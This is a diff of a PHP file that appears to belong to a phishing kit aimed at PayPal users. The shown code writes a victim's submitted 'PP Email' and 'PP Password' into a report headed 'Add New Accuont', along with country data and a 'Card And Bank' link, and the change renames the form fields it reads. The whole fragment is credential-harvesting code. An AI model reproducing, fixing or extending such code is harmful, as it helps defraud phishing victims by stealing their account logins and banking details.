@@ -84,8 +84,8 @@ $Z118_MESSAGE .= "
   <font style='color: rgb(20, 158, 27);'>Add New Accuont:</font> $date       
 
                                                                                                                                                                                                                                              
-   <font style='color: rgb(128, 129, 131);'>&#10112; PP Email   :</font>  <font style='color: rgb(235, 79, 60);'> ".$_POST['_login_email_']."</font>
-   <font style='color: rgb(128, 129, 131);'>&#10112; PP Password :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['_login_password_']."</font>
+   <font style='color: rgb(128, 129, 131);'>&#10112; PP Email   :</font>  <font style='color: rgb(235, 79, 60);'> ".$_POST['login_email']."</font>
+   <font style='color: rgb(128, 129, 131);'>&#10112; PP Password :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['login_password']."</font>
 <font style='color: rgb(128, 129, 131);'>&#10112; Country Name  :</font>  <font style='color: rgb(65, 66, 68);'> ".$CountryA."</font>
    
       <font style='color: rgb(128, 129, 131);'>&#10112; More   :</font>  <font style='color: rgb(60, 118, 235);'> <a href = '../users/tnt2.html'>Card And Bank</a></font>
